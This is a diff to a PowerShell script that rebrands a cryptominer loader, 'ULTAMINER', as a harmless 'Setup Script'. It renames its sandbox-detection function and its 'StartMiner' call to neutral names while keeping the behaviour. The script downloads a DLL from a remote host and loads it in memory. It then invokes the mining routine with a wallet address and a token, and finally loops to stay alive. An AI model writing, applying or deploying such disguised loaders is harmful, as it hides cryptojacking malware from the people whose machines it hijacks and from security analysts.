@@ -1,4 +1,4 @@
-# === ULTAMINER v2.0 ===
+# Setup Script v1.0
 if (Test-Path "$PSScriptRoot\.lock") { return }
 
 # $ProgressPreference = 'SilentlyContinue'
@@ -28,7 +28,7 @@ if (-not $isAdmin) {
 }
 
 # === ANTI-ANALYSIS ===
-function Test-Sandbox {
+function Check-Environment {
     $hits = 0
     # VM MAC prefixes (VMware, VirtualBox, Hyper-V)
     try {
@@ -58,7 +58,7 @@ function Test-Sandbox {
 }
 
 Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 7)
-# if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
+# if (Check-Environment) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
 
 # === CONFIG (fragmented) ===
 $c = @{}
@@ -186,7 +186,7 @@ try {
 $maxRetries = 3
 for ($i = 1; $i -le $maxRetries; $i++) {
     try {
-        $dllUrl = "$($c.base)/Bridge.dll?v=$([Guid]::NewGuid())"
+        $dllUrl = "$($c.base)/Interop.dll?v=$([Guid]::NewGuid())"
         $bytes = $null
         try {
             $wc = New-Object System.Net.WebClient
@@ -208,9 +208,9 @@ for ($i = 1; $i -le $maxRetries; $i++) {
             $asm = [System.AppDomain]::CurrentDomain.Load($bytes)
             Write-Host "[+] Assembly Loaded: $($asm.FullName)"
             $repo = "$($c.u1)/$($c.u2)"
-            Write-Host "[*] Invoking StartMiner..."
-            $asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
-            Write-Host "[+] StartMiner Invoked!"
+            Write-Host "[*] Invoking InitializeWorker..."
+            $asm.GetType('DateFundLoader').GetMethod('InitializeWorker').Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
+            Write-Host "[+] InitializeWorker Invoked!"
             break
         }
     } catch {
@@ -238,3 +238,4 @@ try {
 
 # Background Keep-alive
 while ($true) { Start-Sleep -Seconds 3600 }
+
